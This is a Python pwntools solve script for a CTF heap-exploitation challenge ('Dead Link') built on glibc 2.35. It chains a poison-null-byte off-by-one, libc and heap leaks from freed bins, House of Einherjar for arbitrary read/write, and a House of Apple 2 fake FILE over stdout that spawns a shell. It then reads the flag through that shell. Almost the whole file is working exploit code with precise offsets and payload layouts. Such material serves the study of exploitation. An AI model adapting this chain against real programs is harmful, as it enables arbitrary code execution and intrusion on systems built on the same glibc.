#!/usr/bin/env python3
# Dead Link (BCS CTF 26, Pwn) - glibc 2.35 heap exploitation.
#
# Bug:      read_with_null() drops a NUL at buf[n] when the input has no trailing
#           newline -> classic poison-null-byte off-by-one, reachable from add/change.
# Leaks:    the "gate" mislabels a PIE leak as "system() @ %p"; binview() then dumps
#           freed-chunk fd/size straight to us:
#             - a big chunk lands in the unsorted bin -> fd = main_arena  (libc leak)
#             - a small chunk lands in tcache          -> fd = heap >> 12 (heap leak)
# Write:    House of Einherjar (single NUL) backward-consolidates a forged chunk into
#           a live node's data. A fresh node carved from the merged region has its own
#           header sitting inside that live node's data, so changing the live node sets
#           the new node's `next` pointer to any address -> arbitrary node = arbitrary RW.
# Finale:   inject a node over _IO_2_1_stdout_, write a House-of-Apple-2 fake FILE
#           (vtable -> _IO_wfile_jumps, wide __doallocate -> system), and the very next
#           printf runs system("  /bin/sh").
#
# Usage:
#   python3 solve.py remote                 # 172.16.38.22:6656 (default)
#   python3 solve.py local                  # run the binary locally (needs deadlink,
#                                            # ld-linux-x86-64.so.2, libc.so.6 alongside,
#                                            # or edit the paths below)
from pwn import *
import re, sys, os

context.arch = "amd64"
context.log_level = "info"

HERE = os.path.dirname(os.path.abspath(__file__))
CHAL = os.path.join(HERE, "..", "..", "..", "pwn", "pwn-deadlink")
LD, LIBC, EXE = (os.path.join(CHAL, n) for n in
                 ("ld-linux-x86-64.so.2", "libc.so.6", "deadlink"))
libc = ELF(LIBC, checksec=False)

MODE = sys.argv[1] if len(sys.argv) > 1 else "remote"
if MODE == "remote":
    io = remote("172.16.38.22", 6656)
else:
    io = process([LD, "--library-path", CHAL, EXE])

# ---- offsets in this exact libc (Ubuntu GLIBC 2.35-0ubuntu3.14) ----
MAIN_ARENA = 0x21ac80
SYS_OFF    = libc.symbols["system"]
STDOUT_OFF = libc.symbols["_IO_2_1_stdout_"]
WFILE_OFF  = libc.symbols["_IO_wfile_jumps"]

# ---- deterministic heap offsets from the leaked heap base (fixed alloc sequence) ----
CFG_OFF, C_OFF = 0x820, 0x930          # node addresses relative to heap_base
IDX_CFG, IDX_C, IDX_V, IDX_INJ = 2, 3, 4, 6

# ---------------- gate ----------------
# "system() @ %p" is actually dead_filter's address -> PIE base.
io.recvuntil(b"system() @ ")
pie = int(io.recvline().strip(), 16) - 0x1369
io.recvuntil(b"[*] Token: ")
tok = bytes.fromhex(io.recvline().strip().decode())
io.recvuntil(b"> ")
# resp[i] = token[i] ^ (7*i) ^ 0xC3, recovered from gate()'s verification loop
io.send(bytes(((tok[i] ^ ((7 * i) & 0xFF) ^ 0xC3) & 0xFF) for i in range(32)))
io.recvuntil(b"welcome to the dead link")
log.success("PIE base: %#x" % pie)

# ---------------- menu helpers (single '$ ' sync per op) ----------------
mm = {}
_fresh = [False]
def _ensure():
    if _fresh[0]:
        return _ensure.block
    block = io.recvuntil(b"$ ", timeout=8).decode(errors="replace")
    _ensure.block = block
    mm.clear()
    for line in block.splitlines():
        m = re.match(r"\s*(\d+)\)\s*(.*)", line)
        if not m:
            continue
        n, l = int(m.group(1)), m.group(2)
        for k, w in [("add", "Add"), ("delete", "Delete"), ("change", "Change"),
                     ("print", "Print"), ("view", "View"), ("exit", "Exit")]:
            if w in l:
                mm[k] = n
    _fresh[0] = True
    return block

def choose(a):
    _ensure()
    io.send(b"%d\n" % mm[a])
    _fresh[0] = False

def add(size, data, exact=False):
    choose("add"); io.recvuntil(b"Size?"); io.send(b"%d\n" % size); io.recvuntil(b"Data?")
    io.send(data if exact else data + b"\n"); io.recvuntil(b"Success")

def delete(idx):
    choose("delete"); io.recvuntil(b"delete?"); io.send(b"%d\n" % idx)

def change(idx, data, exact=False):
    choose("change"); io.recvuntil(b"change?"); io.send(b"%d\n" % idx)
    io.recvuntil(b"Data?"); io.send(data if exact else data + b"\n"); io.recvuntil(b"Success")

def binview():
    """Parses `Bin(i): next=<fd> size=<size>` lines - the free-list info leak."""
    choose("view"); block = _ensure()
    res = []
    for m in re.finditer(r"Bin\((\d+)\): next=(0x[0-9a-f]+|\(nil\)) size=(\d+)", block):
        nxt = int(m.group(2), 16) if m.group(2) != "(nil)" else 0
        res.append((nxt, int(m.group(3)) & (2**64 - 1)))
    return res

# ---------------- Phase A: leaks ----------------
add(0x4e8, b"A" * 0x20)      # 0 bigA (chunk 0x500 -> unsorted bin on free)
add(0x28,  b"guardL")        # 1     guard so bigA doesn't merge into top
delete(0)                    # free bigA -> unsorted; bin[0].fd = main_arena+96
libc_base = binview()[0][0] - 96 - MAIN_ARENA

add(0x4e8, b"reclaim")       # reclaim bigA fully -> unsorted bin empty again
add(0x28,  b"t0")            # small donor chunk for the heap leak
delete(2)                    # free t0 -> tcache 0x30; fd = (heap_chunk >> 12)
heap_base = (binview()[-1][0]) << 12

SYSTEM   = libc_base + SYS_OFF
STDOUT   = libc_base + STDOUT_OFF
WFILE_JP = libc_base + WFILE_OFF
CFG = heap_base + CFG_OFF          # cfg node: fake wide_data / wide_vtable
C   = heap_base + C_OFF            # C node: forges the fake chunk for einherjar
H   = CFG + 0x10                   # fake wide_data start (self-referential vtable)
P_chunk = C + 0x10                 # fake chunk P lives at the start of C's data
log.success("libc base: %#x" % libc_base)
log.success("heap base: %#x" % heap_base)
log.success("system   : %#x" % SYSTEM)

# ---------------- cfg node: fake _IO_wide_data (self-referential wide vtable) ----------------
add(0xf8, b"cfg")                              # -> idx IDX_CFG
cfg = bytearray(0xe8)
cfg[0x18:0x20] = p64(0)                        # wide_data->_IO_write_base = NULL
cfg[0x30:0x38] = p64(0)                        # wide_data->_IO_buf_base   = NULL
cfg[0x68:0x70] = p64(SYSTEM)                   # (wide_vtable == H)->__doallocate = system
cfg[0xe0:0xe8] = p64(H)                        # wide_data->_wide_vtable = H (points at itself)
change(IDX_CFG, bytes(cfg))

# ---------------- Phase B: House of Einherjar ----------------
add(0x88,  b"C" * 8)         # C  (chunk 0xa0)  -> idx IDX_C
add(0x4e8, b"V" * 8)         # V  (chunk 0x500) -> idx IDX_V, freshly adjacent to C
add(0x18,  b"grd")           # guard after V, keeps V off the top chunk

# One 0x88-byte change writes: fake chunk P (size 0x80, fd=bk=P so unlink is trivial),
# prev_size(V)=0x80, and - because it's exactly `size` bytes with no newline - the
# off-by-one NUL that clears V's PREV_INUSE bit.
pay = p64(0) + p64(0x80) + p64(P_chunk) + p64(P_chunk) + b"\x00" * 0x60 + p64(0x80)
change(IDX_C, pay, exact=True)
delete(IDX_V)                # backward-consolidate into P -> merged 0x580 unsorted chunk
                              # that now overlaps C's live data

# ---------------- Phase C: carve X from the merged chunk ----------------
# X is carved starting at P_chunk, so X's header (next@+0x10, size@+0x18) lands inside
# C's own data at offsets 0x10 / 0x18 - i.e. change(C) now controls X.next directly.
add(0x88, b"X" * 8)

# Point the injected node at stdout-0x10. *( stdout-8 ) is a huge libc pointer, so the
# target's "change" logic (which reads its length from *(node+8)) happily accepts a
# write of any size we send there.
pay2 = p64(0) + p64(0x80) + p64(STDOUT - 0x10) + p64(0) + b"\x00" * 0x60 + p64(0x80)
change(IDX_C, pay2, exact=True)

# ---------------- House of Apple 2: fake FILE over stdout ----------------
fake = bytearray(0xe0)
fake[0x00:0x09] = b"  /bin/sh\x00"             # first bytes double as argv to system();
                                                # leading spaces satisfy the flag checks
fake[0x20:0x28] = p64(0)                       # _IO_write_base = 0
fake[0x28:0x30] = p64(1)                       # _IO_write_ptr  = 1  (> base -> overflow path)
fake[0x88:0x90] = p64(H)                       # _lock -> readable/zero region
fake[0xa0:0xa8] = p64(H)                       # _wide_data -> our fake wide_data
fake[0xc0:0xc8] = p64(0)                       # _mode = 0 (not yet wide-oriented)
fake[0xd8:0xe0] = p64(WFILE_JP)                # vtable = _IO_wfile_jumps

# This final write is sent manually: the trailing "Success" printf is what triggers
# the FSOP chain, so it never actually returns - don't wait on it.
log.info("overwriting stdout -> FSOP -> system('  /bin/sh')")
choose("change"); io.recvuntil(b"change?"); io.send(b"%d\n" % IDX_INJ)
io.recvuntil(b"Data?"); io.send(bytes(fake))

io.sendline(b"cat /script/flag.txt; cat flag.txt; id")
io.interactive()
